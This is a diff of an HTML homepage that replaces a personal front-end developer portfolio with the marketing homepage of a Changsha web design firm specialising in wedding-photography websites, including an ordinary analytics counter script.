@@ -1,175 +1,709 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
-        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-    <title>尹朝霞个人网站</title>
-    <meta name="keywords" content="wall shelf, free css templates, one page, full site, CSS, HTML"/>
-    <meta name="description" content="Wall Shelf is a free CSS template provided by templatemo.com"/>
-    <link href="templatemo_style.css" rel="stylesheet" type="text/css"/>
-    <link rel="stylesheet" href="css/coda-slider.css" type="text/css" media="screen" title="no title" charset="utf-8"/>
-
-    <script src="js/jquery-1.2.6.js" type="text/javascript"></script>
-    <script src="js/jquery.scrollTo-1.3.3.js" type="text/javascript"></script>
-    <script src="js/jquery.localscroll-1.2.5.js" type="text/javascript" charset="utf-8"></script>
-    <script src="js/jquery.serialScroll-1.2.1.js" type="text/javascript" charset="utf-8"></script>
-    <script src="js/coda-slider.js" type="text/javascript" charset="utf-8"></script>
-    <script src="js/jquery.easing.1.3.js" type="text/javascript" charset="utf-8"></script>
-
+    <!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><![endif]-->
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="baidu_union_verify" content="c05d154d8d8b53ed8da684b13e9622d1">
+    <meta name="keywords" content="亿创网络,影楼网站建设,摄影网站设计,婚庆网站设计,婚纱摄影网站建设,婚纱摄影网站设计,婚纱摄影网站制作,影楼网站设计,影楼网站制作,儿童摄影网站建设,儿童摄影网站设计,儿童摄影网站制作,婚庆网站建设,摄影网站模板,婚纱摄影淘宝店面装修,影楼淘宝店面装修,武汉婚纱摄影网站建设,北京婚纱摄影网站建设" />
+    <meta name="description" content="亿创网络是影楼网站建设、摄影网站设计专家,为您提供专业的婚庆网站设计,婚纱摄影网站建设,婚纱摄影网站设计,婚纱摄影网站制作,影楼网站设计,影楼网站制作,儿童摄影网站建设,儿童摄影网站设计,儿童摄影网站制作,婚庆网站建设,摄影网站模板,婚纱摄影淘宝店面装修,影楼淘宝店面装修。" />
+    <link rel="shortcut icon" href="favicon.ico">
+    <title>【亿创网络】长沙网站建设|影楼网站建设|摄影网站设计|婚庆网站设计|婚纱摄影网站制作|儿童摄影网站模板|影楼淘宝店面装修</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, minimal-ui">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="baidu-tc-verification" content="0327b412380a5dd19d89ee8a02e39fc5" />
+    <meta name="wlhlauth" content="b618111140e308af9c6db3bca44dfeb7"/>
+    <meta name="baidu-site-verification" content="W2jtZ5sL83" />
+    <link rel="shortcut icon" href="aidi.ico" />
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/menu.css" />
+    <link rel="stylesheet" href="css/animate.css" />
+    <!--[if lt IE 9]><link rel="stylesheet" href="css/ie.css" /><![endif]-->
 </head>
-<body>
-
-<div id="slider">
-
-    <div id="header_wrapper">
-        <div id="header">
-            <a href="#home">尹朝霞 | WEB前端</a>
+<body class="indexPage" onload="overLay()">
+<!--loading-->
+<div class="overLay" style="display:noen;">
+    <img src="/templates/pc/images/loading.gif">
+</div>
+<!--loading-->
+<!--网站头部模块-->
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">
+                <img src="/templates/pc/images/logoHd.png">
+            </a>
         </div>
-    </div>
-
-    <div id="menu_wrapper">
-        <div id="menu">
-            <ul class="navigation">
-                <!--<li><a href="#home" class="selected">Home<span class="ui_icon home"></span></a></li>-->
-                <li><a href="#aboutus" class="selected">About Me<span class="ui_icon aboutus"></span></a></li>
-                <li><a href="#services">Skills<span class="ui_icon services"></span></a></li>
-                <li><a href="#gallery">Project<span class="ui_icon gallery"></span></a></li>
-                <!--<li><a href="#">Resume</a></li>-->
-                <li><a href="#contactus">Contact<span class="ui_icon contactus"></span></a></li>
-
+        <div class="navbar-collapse collapse">
+            <ul class="nav navbar-nav navbar-right">
+                <li  class='sel'><a href="/">亿创首页</a></li>
+                <li><a href="/works.html">亿创案例</a></li>
+                <li><a href="http://www16.53kf.com/webCompany.php?arg=10142118&style=1" target="_blank" >摄影网站模板</a></li>
+                <li><a href="/service.html">亿创服务</a></li>
+                <li><a href="/study.html">行业动态</a></li>
+                <li><a href="/about.html">关于我们</a></li>
             </ul>
         </div>
     </div>
+</div>
+<!--网站头部模块-->
 
-    <div id="content_wrapper">
-        <div id="content">
-
-            <div class="scroll">
-                <div class="scrollContainer">
-                    <!--关于我-->
-                    <div class="panel" id="aboutus">
-                        <div id="about">
-                            <h1>About Me</h1>
-                            <div class="image_wrapper image_fl"><img src="images/fj.png" alt="image 3" width="230" height="280"/>
-                            </div>
-                            <h4>90后，14年本科毕业，就读湖南工学院信息与计算科学系</h4>
-                            <h4>爱好：</h4>
-                            <p>旅游 看书 听歌</p>
-                            <h4>自我评价:</h4>
-                            <p>性格成熟、稳重，待人热情，能迅速适应环境</p>
-                            <p>能够与团队其他人员沟通交流，具备良好的团队合作和分享能力，较强技术学习能力</p>
-                            <p>对web前端开发有很浓厚的兴趣，在工作中对问题分析细致，具有钻研精神，吃苦耐劳，认真细心</p>
-                            <p>能利用空闲时间学习，充实自己，在学习中遇到不懂的能谦虚的请教他人</p>
-                        </div>
-
-                        <div class="cleaner_h30"></div>
-
-                    </div>
-
-                    <div class="panel" id="services">
-                        <div id="skills">
-                                <h1>Skills</h1>
-                                <ul>
-                                    <li>精通jQuery 实现DOM操作和各种动画效果 </li>
-                                    <li> 熟悉OOP编程,根据面向对象思想完成了一个flappy bird小游戏,并对其功能代码进行封装</li>
-                                    <li> 熟悉Bootstrap 框架,能使用栅格系统,CSS样式,组件和JavaScript插件对网页进行布局</li>
-                                    <li> 精通AJAX异步加载,实现瀑布流，连接API，如:和风天气API,高德地图API.并能使用jsonp实现跨域请求</li>
-                                    <li>熟悉HTML5新标签,比如:canvas绘制各种图形,svg标签实现商品展示效果,了解ECharts开源图表库 </li>
-                                    <li>熟悉CSS3多种选择器,能够通过transform及animation属性实现3D图片旋转等多种动画效果,了解弹性盒子,了解媒体查询 </li>
-                                    <li>...... </li>
-                                </ul>
-                        </div>
-                    </div>
-
-                    <div class="panel" id="gallery">
-                        <div id="project">
-                            <h1>Project</h1>
-
-                            <div id="gallery_container">
-                                <div class="gallery_box">
-                                    <a href="http://www.cssmoban.com/" target="_parent"><img
-                                            src="images/gallery/dbdy.png" alt="1"/></a>
-                                    <h4>豆瓣电影</h4>
-                                    <p>利用豆瓣电影的API,制作一个实时更新最新电影的网页,主要模块有影讯、排行榜、影评、年度榜单等。
-                                        影讯页面中分为正在上映和即将上映两部分。
-                                        排行榜显示热门电影，可选择分类进行排行。</p>
-                                    <div class="btn_more"><a href="豆瓣电影/index.html">Visit <span>&raquo;</span></a></div>
-                                    <div class="cleaner"></div>
-                                </div>
-                                <div class="gallery_box">
-                                    <a href="#" target="_parent"><img src="images/gallery/lxzg.png" alt="2"/></a>
-                                    <h4>联想中国网站</h4>
-                                    <p>该项目主要是联想中国官网的首页,用于联想的商品展示,主要包括登录注册,商品列表,电脑,手机,电脑增值服务及社交平台</p>
-                                    <div class="btn_more"><a href="联想中国/index.html">Visit <span>&raquo;</span></a></div>
-                                    <div class="cleaner"></div>
-                                </div>
-                                <div class="gallery_box">
-                                    <a href="#" target="_parent"><img src="images/gallery/3dzpq.png" alt="3"/></a>
-                                    <h4>3D照片墙</h4>
-                                    <p>3D照片墙用于照片的展示,让其呈现很炫的立体效果,给用户很好的视觉感</p>
-                                    <div class="btn_more"><a href="3D照片墙/3D图片旋转.html">Visit <span>&raquo;</span></a></div>
-                                    <div class="cleaner"></div>
-                                </div>
-                                <div class="gallery_box">
-                                    <img src="images/gallery/dkyd.png" alt="4"/>
-                                    <h4>多看阅读项目</h4>
-                                    <p> 多看阅读主要包括首页、个人中心、购物车、订单、我的余额、登录页面,首页中主要是图书列表及图书信息
-                                        个人中心包括账号设置,订单及我的余额模块
-                                    </p>
-                                    <div class="btn_more"><a href="多看阅读/首页.html">Visit <span>&raquo;</span></a></div>
-                                    <div class="cleaner"></div>
-                                </div>
-                                <div class="gallery_box">
-                                    <img src="images/gallery/image_05.jpg" alt="5"/>
-                                    <h4>Project Title 5</h4>
-                                    <p> Curabitur iaculis enim dolor. Sed quis augue ligula. Quisque aliquet egestas felis,
-                                        in egestas turpis sodales et. In ac diam ut orci viverra bibendum. </p>
-                                    <div class="btn_more"><a href="#">Visit <span>&raquo;</span></a></div>
-                                    <div class="cleaner"></div>
-                                </div>
-                                <div class="gallery_box">
-                                    <img src="images/gallery/image_06.jpg" alt="6"/>
-                                    <h4>Project Title 6</h4>
-                                    <p>Sed in viverra nulla. Duis rutrum vehicula ligula, non tempor nunc congue et. Nunc
-                                        sit amet tortor nulla, ut eleifend enim sed condimentum tellus vestibulum in.</p>
-                                    <div class="btn_more"><a href="#">Visit <span>&raquo;</span></a></div>
-                                    <div class="cleaner"></div>
-                                </div>
-                                <div class="cleaner"></div>
-                            </div>
-                        </div>
-
-
-                    </div>
-
-                    <div class="panel" id="contactus">
-                        <div id="contact">
-                            <h1>Contact Me</h1>
-                            <br>
-                            <div class="col_380 float_l">
-                                <h4>QQ</h4>
-                                <p>498119099</p>
-                                <h4>Tel</h4>
-                                <p>17767150463</p>
-                            </div>
-                            <div class="float_r">
-
-                                <h4>Email</h4>
-                                <p>498119099@qq.com </p>
-                                <p>yzhaoxia523@163.com</p>
-                            </div>
-                        </div>
-
-                    </div>
-
+<!--首页顶部开场动画-->
+<div class="indexBnr swiper-container">
+    <ul class="bnrList swiper-wrapper">
+        <li class="swiper-slide bnrMobile1"><div class="bnrImg"></div></li>
+        <li class="swiper-slide bnrMobile2"><div class="bnrImg"></div></li>
+        <li class="swiper-slide bnrMobile3"><div class="bnrImg"></div></li>
+    </ul>
+    <div class="bnrCtl pagination"></div>
+</div>
+<div class="idxTop idxTop1">
+    <div class="g-inr">
+        <div class="sloganWrap">
+            <div class="slogan slogan1">we focus on</div>
+            <div class="slogan slogan2">Providing specialized interactive media solutions</div>
+            <div class="slogan slogan3">我们专注于创新和探索交互式设计开发为品牌提供全新的数字化营销服务</div>
+        </div>
+        <div class="wave1"></div>
+        <div class="wave2"></div>
+        <div class="idxAnt idxAnt1" style="display:none;">
+            <div class="book">
+                <div class="elm elm1"></div>
+                <div class="elm elm2"></div>
+                <p class="elm elm3">品牌网络形象设计</p>
+                <p class="elm elm4">NETWORK BRAND</p>
+            </div>
+            <div class="fish1Wrap">
+                <div class="fish fish1"><span class="water"></span></div>
+                <div class="fish fish2"></div>
+                <div class="fish fish3"></div>
+                <div class="fish fish4"></div>
+                <div class="fish fish5"></div>
+                <div class="fish fish6"></div>
+            </div>
+        </div>
+        <div class="idxAnt idxAnt2" style="display:none;">
+            <div class="trg">
+                <div class="elm elm1"></div>
+                <div class="elm elm2">场景应用 LIVE APP</div>
+                <p class="elm elm3">极致体验 简易连接</p>
+                <div class="elm elm4"></div>
+            </div>
+            <div class="fish2Wrap">
+                <div class="fish fish1"></div>
+                <div class="fish fish2"></div>
+                <div class="fish fish3"></div>
+                <div class="fish fish4"></div>
+                <div class="fish fish5"></div>
+                <div class="fish fish6"></div>
+                <div class="phone"></div>
+                <div class="bubbleWrap">
+                    <span class="bubble bubble1"></span>
+                    <span class="bubble bubble2"></span>
+                    <span class="bubble bubble3"></span>
                 </div>
             </div>
+        </div>
+        <div class="idxAnt idxAnt3" style="display:none;">
+            <div class="circle">
+                <div class="elm elm1"></div>
+                <div class="elm elm2"></div>
+                <p class="elm elm3"></p>
+                <p class="elm elm4"></p>
+            </div>
+            <div class="qeWrap">
+                <div class="qe qe1"></div>
+                <div class="qe qe2"></div>
+                <div class="qe qe3"></div>
+                <div class="qe qe4"></div>
+            </div>
+            <div class="dotWrap">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+        </div>
+        <div class="idxAntCtl" id="idxAntCtl">
+            <span class="sprite sel"></span>
+            <span class="sprite"></span>
+            <span class="sprite"></span>
+        </div>
+    </div>
+</div>
+<!--首页顶部开场动画-->
 
-            <!-- end of scroll -->
+<!--网站内容模块-->
+<div class="idxMdl idxMdl1">
+    <div class="g-inr">
+        <h1 class="title">亿创网络<strong>为价值而生</strong></h1>
+        <div class="intro">
+            <a href="works.html">全部</a>
+            <span class="split">/</span>
 
-        </div> <!-- end of content -->
-    </div> <!-- end of content_wrapper -->
-</div> <!-- end of slider -->
+            <a href="works.html?sect=163">网站案例</a><span class="split">/</span>
+
+            <a href="works.html?sect=161">活动设计</a><span class="split">/</span>
+
+            <a href="works.html?sect=160">淘宝装修</a><span class="split">/</span>
+
+            <a  href="tencent://message/?uin=1350773695&amp;Site=亿创网络&amp;Menu=yes">等你好辛苦点我吧</a><span class="split">/</span>
+        </div>
+        <ul class="caseList">
+
+            <li>
+                <a class="imgWrap" href="/works/show-985.html">
+                    <img src="/upload/201702/09/201702091910101262.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-983.html">
+                    <img src="/upload/201702/06/201702060934289073.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-982.html">
+                    <img src="/upload/201702/06/201702060915140816.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-981.html">
+                    <img src="/upload/201702/05/201702052252189073.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-980.html">
+                    <img src="/upload/201702/05/201702052247177511.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-979.html">
+                    <img src="/upload/201702/05/201702052242292823.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-976.html">
+                    <img src="/upload/201702/05/201702052124423448.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-975.html">
+                    <img src="/upload/201702/05/201702052118130479.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-932.html">
+                    <img src="/upload/201606/28/201606281708369790.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-931.html">
+                    <img src="/upload/201606/28/201606281658042485.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-930.html">
+                    <img src="/upload/201606/28/201606281639571870.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+            <li>
+                <a class="imgWrap" href="/works/show-929.html">
+                    <img src="/upload/201606/28/201606281554542465.jpg">
+                    <div class="mask trst">
+                        <span class="bg"></span>
+                        <span class="ico sprite"></span>
+                    </div>
+                </a>
+            </li>
+
+
+
+        </ul>
+    </div>
+</div>
+<div class="idxMdl idxMdl2">
+    <div class="g-inr">
+        <h1 class="title">WE PURSUE<strong>追求的事业</strong></h1>
+        <div class="intro">亿创人坚信为社会创造价值才是企业真正的使命所在！并因此不断超越</div>
+        <ul class="domainList">
+            <li>
+                <span class="ico ico1 sprite"></span>
+                <p class="text">PC/移动网站建设</p>
+            </li>
+            <li>
+                <span class="ico ico2 sprite"></span>
+                <p class="text">移动APP开发</p>
+            </li>
+            <li>
+                <span class="ico ico3 sprite"></span>
+                <p class="text">样片包装设计</p>
+            </li>
+            <li>
+                <span class="ico ico4 sprite"></span>
+                <p class="text">积分商城开发</p>
+            </li>
+            <li>
+                <span class="ico ico5 sprite"></span>
+                <p class="text">微信开发</p>
+            </li>
+        </ul>
+    </div>
+</div>
+<div class="idxMdl idxMdl3">
+    <div class="g-inr">
+        <h1 class="title">我们是设计师、工程师、梦想者<br/>也是您的用户体验专家</h1>
+        <div class="intro">
+            <p>E-CNET亿创网络专注于创新和探索交互设计开发，</p>
+            <p>致力于为企业提供全新的数字化产品服务。</p>
+            <br/>
+            <p>我们强调个性定制化的方式与客户沟通，通过新创意、新技术、新媒体的结合运用，</p>
+            <p>为客户提供整合的互联网交互解决方案与全方位的视觉传播服务。</p>
+        </div>
+        <div class="links">
+            <a class="f-fl" href="tencent://message/?uin=1350773695&Site=亿创网络&Menu=yes">咨询我们</a>
+            <a class="f-fr" href="about.html">了解更多</a>
+        </div>
+    </div>
+</div>
+<div class="idxMdl idxMdl5">
+    <div class="g-inr">
+        <h1 class="title">SINCERE THANKS<strong>感谢你们</strong></h1>
+        <div class="intro">从初识到现在长久的合作，我们始终知道您拥有重新选择别人的权利</div>
+        <ul class="partnerList">
+
+            <li>
+
+                <img src="/upload/201608/05/201608051640441547.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201608/05/201608051636442485.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201608/05/201608051631576860.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201608/05/201608051631482800.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201608/05/201608051630556236.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201608/05/201608051630341859.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081723494235.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081719539752.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081717172838.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081714112292.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081711390768.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081707415368.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081702543463.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081651159713.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081647296295.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081645093258.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081642113600.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201607/08/201607081640163424.png">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261501330418.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261456255359.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261452001228.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261450108279.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261446472712.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261442058562.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261430108650.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261431563992.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261435066795.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261436197214.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261438113679.jpg">
+
+            </li>
+
+            <li>
+
+                <img src="/upload/201606/26/201606261439315212.jpg">
+
+            </li>
+
+
+
+        </ul>
+    </div>
+</div>
+<!--网站内容模块-->
+
+<!--网站尾部模块-->
+<div class="g-cat">
+    <div class="g-inr">
+        <div class="catL clearFix">
+            <div class="catAdr">
+                <span class="ico sprite"></span>
+                <div class="adrs clearFix">
+                    <div class="adr adrShow">
+                        <p class="t1">长沙</p>
+                        <p class="t2">天心区芙蓉南路兰亭玥岛1栋706室</p>
+                    </div>
+                    <span class="split" style="display:none;">/</span>
+                    <div class="adr">
+                        <p class="t1" style="display:none;">上海</p>
+                        <p class="t2" style="display:none;">崇明县长兴乡新建村合新路168号一号楼113室</p>
+                    </div>
+                </div>
+            </div>
+            <div class="catContact">
+                <span class="ico sprite"></span>
+                <p class="tel"><strong>T</strong> : 153-8647-0407（长沙服务电话）</p>
+                <p class="mail">Mail: <a href="mailto:e_cnet@126.com">e_cnet@126.com</a>&nbsp;&nbsp;/&nbsp;&nbsp;<a href="mailto:1350773695@qq.com">1350773695@qq.com</a></p>
+            </div>
+        </div>
+        <div class="catR clearFix">
+            <a class="catMap" target="_blank" href="http://map.baidu.com/?shareurl=1&poiShareUid=55888bfafcac034b3b221cfe">
+                <span class="titIco sprite trst"></span>
+                <span class="titText">在 <strong>Baidu maps</strong> 上找我们</span>
+            </a>
+        </div>
+    </div>
+</div>
+
+<div class="g-point">
+    <div class="g-inr">
+        <h5 class="pointTit">Our point</h5>
+        <div class="pointListWrap">
+            <ul class="pointList">
+
+
+
+                <li>
+                    <a class="title f-toe" href="/study/show-984.html">古装摄影网络预约页面怎样设计</a>
+                    <span class="split">/</span>
+
+                    <a class="title f-toe" href="/study/show-973.html">影楼服务建站商家如何选择</a>
+                </li>
+
+                <li>
+                    <a class="title f-toe" href="/study/show-972.html">微博营销提升关注度是关键</a>
+                    <span class="split">/</span>
+
+                    <a class="title f-toe" href="/study/show-971.html">微信营销如何避免骚扰又提升销量</a>
+                </li>
+
+                <li>
+                    <a class="title f-toe" href="/study/show-970.html">摄影网站建设考虑要点有哪些</a>
+                    <span class="split">/</span>
+
+
+
+            </ul>
+        </div>
+        <a class="pointMore f-ts1" href="/study.html">GET MORE +</a>
+    </div>
+</div>
+
+<div class="g-ft">
+    <div class="g-inr">
+        <div class="ftL">
+            <a class="ftLogo" href="index.html"><img src="/templates/pc/images/logoFt.png"></a>
+            <div class="ftCpr">
+                <p>Copyright © 2010-2016 e-cnet.cn</p>
+                <p>All rights reserved  备案号:湘ICP备16010988号-1 <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260136972'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/stat.php%3Fid%3D1260136972%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script></p>
+            </div>
+            <p style="width:382px; line-height:20px;">主营：影楼网站建设,摄影网站设计,婚庆网站设计,婚纱摄影网站建设,婚纱摄影网站设计,婚纱摄影网站制作,影楼网站设计,影楼网站制作,儿童摄影网站建设,儿童摄影网站设计,儿童摄影网站制作,婚庆网站建设,摄影网站模板,婚纱摄影淘宝店面装修,影楼淘宝店面装修</p>
+        </div>
+        <div class="ftR">
+            <div class="ftBook">
+                <form action="" method="">
+                    <div class="textWrap">
+                        <input id="subscribe-email" class="inputText text" name="address" type="text" placeholder="Your E-mail Address">
+
+                    </div>
+                    <input id="subscribe" class="submit trst" type="button" value="订阅">
+                </form>
+            </div>
+            <div class="ftNav">
+                <a href="/works.html">案例</a>
+                <span class="split">/</span>
+                <a href="/study.html">研究</a>
+                <span class="split">/</span>
+                <a href="/about.html">关于</a>
+            </div>
+        </div>
+
+        <div class="ftWx" style="display:none;">
+            <img class="wxImg" src="/templates/pc/images/wxCode.jpg"/>
+            <p class="wxText">亿创网络微信公众号</p>
+        </div>
+    </div>
+</div>
+
+<!--网站尾部模块-->
+
+<!--网站脚本加载模块-->
+<script src="/templates/pc/js/jquery-1.8.2.min.js"></script>
+<script src="/templates/pc/js/jquery.plus.extend.js"></script>
+<script src="/templates/pc/js/bootstrap.js"></script>
+<script src="/templates/pc/js/jquery.bootstrap-autohidingnavbar.js"></script>
+<script src="/templates/pc/js/jquery.main.js"></script>
+<script src="/templates/pc/js/swiper.jquery.min.js"></script>
+<script src="/templates/pc/js/jquery.index.js"></script>
+<script src="/templates/pc/js/about.js"></script>
+<!--网站脚本加载模块-->
+
+<div style="background:#333333;">
+    <div style="width:90%; height:auto; margin:0px auto; padding:10px 0px;">
+        <div style="float:left;">
+            友情链接：
+        </div>
+        <div class="bd">
+
+            <a  target="_blank" href="http://www.bjcoco.com/" style="color:#999; line-height:20px;">北京COCO婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.beauty4love.cn/" style="color:#999; line-height:20px;">天津爱美汇婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.cltcdj.com/" style="color:#999; line-height:20px;">长乐天长地久婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.my-li.com/" style="color:#999; line-height:20px;">重庆莉映画摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.aixihui.com/" style="color:#999; line-height:20px;">天津爱喜汇婚礼策划&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.2046sheying.net/" style="color:#999; line-height:20px;">北京2046摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.yyfeifan.com/" style="color:#999; line-height:20px;">岳阳非凡丽致摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.oubixi.com/" style="color:#999; line-height:20px;">岳阳欧碧玺新派摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.5152.com.cn" style="color:#999; line-height:20px;">合肥5152婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.jsmltl.com/" style="color:#999; line-height:20px;">铜陵金色米兰婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.mandihs.com.cn/" style="color:#999; line-height:20px;">曼蒂国际婚纱会馆&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.jan-image.com/" style="color:#999; line-height:20px;">福州简映像婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.zafilm.cn/" style="color:#999; line-height:20px;">帧爱南极星&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.syxgsy.com/" style="color:#999; line-height:20px;">三亚喜歌婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.rose-raymond.com/" style="color:#999; line-height:20px;">海南路思莱曼婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.bjbobo.com" style="color:#999; line-height:20px;">北京BOBO婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.muxiang100.com/" style="color:#999; line-height:20px;">北京木巷婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.bjxcysy.com" style="color:#999; line-height:20px;">北京星辰园婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.blgjsy.com/" style="color:#999; line-height:20px;">北京风尚巴黎摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.angel520.cn/" style="color:#999; line-height:20px;">东莞天使之恋婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.520hancheng.com/" style="color:#999; line-height:20px;">广州韩城映像摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.redapphoto.com/" style="color:#999; line-height:20px;">广州红苹果摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.stgshs.com/" style="color:#999; line-height:20px;">汕头古摄影婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.stbjhs.com/" style="color:#999; line-height:20px;">汕头伯爵婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.cnglyx.cn/" style="color:#999; line-height:20px;">汕头格林印象摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+            <a  target="_blank" href="http://www.jybjhssy.com/" style="color:#999; line-height:20px;">揭阳伯爵婚纱摄影&nbsp;&nbsp;|&nbsp;&nbsp; </a>
+
+
+        </div>
+    </div>
+</div>
